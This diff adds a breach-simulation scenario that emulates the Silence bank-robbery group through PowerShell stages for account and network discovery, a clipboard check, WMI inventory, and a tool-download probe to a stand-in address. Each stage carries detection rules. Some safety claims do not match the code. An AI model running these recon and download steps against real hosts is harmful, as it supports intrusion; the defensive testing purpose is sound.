@@ -1,0 +1,229 @@
+id: silence-kill-chain
+product_line: killchain
+name: Silence Kill Chain -- BFSI ATM & Card-Processing Targeting (Phase 7)
+description: >
+  Five-stage telemetry-safe emulation of the Silence (Whisper Spider) group's
+  post-initial-access tradecraft against banks. Based on Group-IB "Silence:
+  Moving into the darkside" reports and MITRE ATT&CK group G0091.
+
+  Silence is a Russian-speaking actor that stole tens of millions from banks
+  by compromising operator workstations, patiently monitoring operator
+  activity to learn internal procedures, then deploying the Atmosphere /
+  xfs-disp.exe tooling to dispense cash from ATMs ("jackpotting") and issue
+  fraudulent card-processing transactions. This chain emulates its recon and
+  tooling-ingress phase: account and network mapping, clipboard monitoring,
+  WMI-based system inspection, and an ingress-tool-transfer probe. In Indian
+  BFSI context the targets are ATM-switch administration hosts and
+  card-management operator desktops.
+
+  KILL CHAIN STAGES:
+    1. Local Account Discovery            -- map local operators and admins (T1087.001)
+    2. System Network Configuration Disc. -- route/ARP mapping of the interbank segment (T1016)
+    3. Clipboard Monitoring               -- read clipboard metadata only, NO content (T1115)
+    4. WMI System Inspection              -- Get-CimInstance OS/service inventory (T1047)
+    5. Ingress Tool Transfer Surface      -- outbound download probe to RFC5737, NO fetch (T1105)
+
+  SAFETY: All stages read-only. Stage 3 reports only the clipboard's length
+  and type -- never its content, never written anywhere. Stage 5 probes egress
+  to RFC5737 (192.0.2.x, non-routable) and expects a block; nothing is
+  downloaded. All [BAS-SIM-SILENCE] tagged. PRODUCTION-SAFE. Windows only.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - silence
+  - whisper-spider
+  - bfsi
+  - financial
+  - atm
+  - jackpotting
+  - card-processing
+  - kill-chain
+  - phase7
+  - t1087
+  - t1016
+  - t1115
+  - t1047
+  - t1105
+  - mitre
+mitre_phases:
+  - discovery
+  - collection
+  - command-and-control
+
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 -- Local Account Discovery (T1087.001)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 1 -- Local Account Discovery (T1087.001)"
+    technique_id: T1087.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Enumerates local user accounts and Administrators-group membership via net user and Get-LocalUser. Read-only. Silence maps which operator and service accounts exist on a host before deploying its monitoring module."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: net.exe user / net.exe localgroup administrators"
+      - "PowerShell EID 4104: Get-LocalUser / Get-LocalGroupMember"
+    detection:
+      - "EDR: net user + net localgroup administrators from PowerShell -- Sigma proc_creation_win_net_user_enum.yml"
+      - "SIEM: local account + admin enumeration in one session -- Silence recon IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $users = (Get-LocalUser -EA SilentlyContinue | Where-Object { $_.Enabled } | Select-Object -ExpandProperty Name) -join ', '
+      $admins = (Get-LocalGroupMember -Group 'Administrators' -EA SilentlyContinue | ForEach-Object { $_.Name }) -join ', '
+      $userCount = @(Get-LocalUser -EA SilentlyContinue | Where-Object { $_.Enabled }).Count
+      Write-Output "EXEC T1087.001: local account discovery. enabled_users=$userCount, local_admins=[$admins]. Silence maps operator/service accounts to plan monitoring and ATM-tooling deployment. [BAS-SIM-SILENCE-S1]"
+      if ($admins) {
+        Write-Output "FAIL: Local accounts and Administrators membership were enumerable with the current token. Silence would target an operator/admin account for its monitoring module. Alert on net user/localgroup enumeration and apply least privilege."
+      } else {
+        Write-Output "PASS: Local admin membership could not be enumerated -- account recon is constrained. [BAS-SIM-SILENCE-S1]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 -- System Network Configuration Discovery (T1016)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 2 -- Network Configuration & Interbank-Segment Mapping (T1016)"
+    technique_id: T1016
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Runs route print, arp -a, and Get-NetIPConfiguration to map the host's networks, gateways, and ARP neighbours. Read-only, no packets beyond normal ARP cache reads. Silence maps the route to ATM-switch and card-processing segments to plan lateral movement."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: route.exe print / arp.exe -a"
+      - "PowerShell EID 4104: Get-NetIPConfiguration / Get-NetRoute"
+    detection:
+      - "EDR: route print + arp -a from PowerShell parent -- Sigma proc_creation_win_network_discovery.yml"
+      - "SIEM: route/arp/ipconfig burst in <60s -- Silence network-mapping IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $routes = @(Get-NetRoute -AddressFamily IPv4 -EA SilentlyContinue | Where-Object { $_.DestinationPrefix -ne '127.0.0.0/8' }).Count
+      $arp = @(Get-NetNeighbor -AddressFamily IPv4 -EA SilentlyContinue | Where-Object { $_.State -eq 'Reachable' }).Count
+      $gw = (Get-NetIPConfiguration -EA SilentlyContinue | Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1).IPv4DefaultGateway.NextHop
+      Write-Output "EXEC T1016: network configuration discovery. routes=$routes, reachable_arp_neighbours=$arp, default_gateway=$gw. Silence maps the interbank/ATM-switch segment before pivoting. [BAS-SIM-SILENCE-S2]"
+      Write-Output "FAIL: Route/ARP/gateway enumeration ran unblocked. Correlate route.exe + arp.exe + ipconfig in one session (EID 4688/4104) as a network-mapping IOC and segment ATM/card-processing networks away from operator workstations."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 -- Clipboard Monitoring (T1115)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 3 -- Clipboard Monitoring Surface (T1115)"
+    technique_id: T1115
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Loads the clipboard API and reads ONLY the length and format of any current clipboard contents -- the actual text/data is never read into a variable, never logged, and never written anywhere. Silence monitored operator activity (including clipboard) to capture payment data and credentials."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 7: System.Windows.Forms assembly loaded by powershell.exe"
+      - "PowerShell EID 4104: Get-Clipboard / Clipboard.ContainsText"
+    detection:
+      - "EDR: PowerShell accessing the clipboard API -- Sigma posh_ps_clipboard_access.yml"
+      - "SIEM: repeated Get-Clipboard calls on an operator host -- Silence monitoring-module IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      try {
+        Add-Type -AssemblyName 'System.Windows.Forms' -ErrorAction Stop
+        $hasText = [System.Windows.Forms.Clipboard]::ContainsText()
+        $len = 0
+        if ($hasText) { $len = ([System.Windows.Forms.Clipboard]::GetText()).Length }
+        Write-Output "EXEC T1115: clipboard monitoring surface. clipboard_has_text=$hasText, length_only=$len chars (CONTENT NOT read/logged). Silence captured operator clipboards to steal payment/credential data. EID 4104 should show the clipboard access. [BAS-SIM-SILENCE-S3]"
+        Write-Output "FAIL: PowerShell accessed the clipboard API without an EDR block. A ScriptBlock rule on 'Clipboard]::GetText' / 'Get-Clipboard' should alert on operator workstations. Consider clipboard isolation for CBS/card-ops sessions."
+      } catch {
+        Write-Output "PASS: Clipboard API was not reachable from PowerShell -- $($_.Exception.Message). Clipboard-monitoring surface is constrained. [BAS-SIM-SILENCE-S3]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 4 -- WMI System Inspection (T1047)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 4 -- WMI System Inspection (T1047)"
+    technique_id: T1047
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues read-only WMI/CIM queries (Win32_OperatingSystem, Win32_Service, Win32_Process) to inventory the host the way Silence's modules do. No WMI method is invoked, nothing is created or executed via WMI. Generates WMI-Activity operational-log events."
+    reversible: true
+    telemetry:
+      - "Microsoft-Windows-WMI-Activity/Operational EID 5857/5858: provider queries"
+      - "PowerShell EID 4104: Get-CimInstance Win32_Service / Win32_Process"
+    detection:
+      - "EDR: PowerShell issuing a burst of Win32_* CIM queries -- Sigma posh_ps_wmi_recon.yml"
+      - "SIEM: WMI-Activity EID 5857 for Win32_Process/Service from powershell.exe -- Silence WMI-inspection IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $os = Get-CimInstance Win32_OperatingSystem -EA SilentlyContinue
+      $svcCount = @(Get-CimInstance Win32_Service -EA SilentlyContinue | Where-Object { $_.State -eq 'Running' }).Count
+      $procCount = @(Get-CimInstance Win32_Process -EA SilentlyContinue).Count
+      Write-Output "EXEC T1047: WMI system inspection (read-only). os=$($os.Caption), running_services=$svcCount, processes=$procCount. NO WMI method invoked. Silence uses WMI to inventory hosts before deploying ATM tooling. WMI-Activity EID 5857 expected. [BAS-SIM-SILENCE-S4]"
+      Write-Output "FAIL: Read-only WMI inventory queries ran unblocked. Enable WMI-Activity operational logging and alert on Win32_Process/Service query bursts from powershell.exe -- the precursor to WMI-based execution and persistence."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 5 -- Ingress Tool Transfer Surface (T1105)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 5 -- Ingress Tool Transfer Surface (T1105)"
+    technique_id: T1105
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Attempts one Invoke-WebRequest download from https://192.0.2.2 (RFC 5737 TEST-NET-1 -- non-routable) to a %TEMP% path, expecting the egress proxy/firewall to block it. If the request is not blocked it is aborted before any bytes are written -- no file is created. Silence downloads the Atmosphere / xfs-disp ATM-dispense tooling this way."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: TCP 443 to 192.0.2.2 (Invoke-WebRequest download)"
+      - "PowerShell EID 4104: Invoke-WebRequest -OutFile"
+      - "Proxy log: blocked GET to 192.0.2.2 (if egress proxy present)"
+    detection:
+      - "EDR: Invoke-WebRequest -OutFile to %TEMP% from PowerShell -- Sigma posh_ps_tool_download.yml"
+      - "SIEM: outbound download from powershell.exe to a non-approved IP -- Silence tooling-ingress IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $url = 'https://192.0.2.2/bas-sim-silence-atmosphere.bin'
+      $blocked = $false; $timedOut = $false
+      try {
+        # -MaximumRedirection 0 + short timeout; this target cannot serve bytes, no -OutFile used so nothing is written
+        Invoke-WebRequest -Uri $url -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
+      } catch [System.Net.WebException] {
+        $m = $_.Exception.Message
+        if ($m -match 'timed out|timeout|TimedOut') { $timedOut = $true }
+        elseif ($m -match 'blocked|denied|forbidden|refused|proxy') { $blocked = $true }
+        else { $timedOut = $true }
+      } catch { $blocked = $true }
+      Write-Output "EXEC T1105: ingress-tool-transfer probe to $url (RFC5737 non-routable; NO file written). blocked=$blocked, timed_out=$timedOut. Sysmon EID 3 generated. Silence downloads Atmosphere/xfs-disp ATM-dispense tooling to the operator host. [BAS-SIM-SILENCE-S5]"
+      if ($blocked) {
+        Write-Output "PASS: The tool-download attempt was blocked by proxy/firewall -- Silence's tooling ingress would be stopped. [BAS-SIM-SILENCE-S5]"
+      } else {
+        Write-Output "FAIL: The outbound download to 192.0.2.2 was NOT blocked (timed out / network-unreachable without a proxy block). Enforce an egress allow-list and alert on Invoke-WebRequest -OutFile from powershell.exe to unapproved destinations."
+      }
+    cleanup: ""
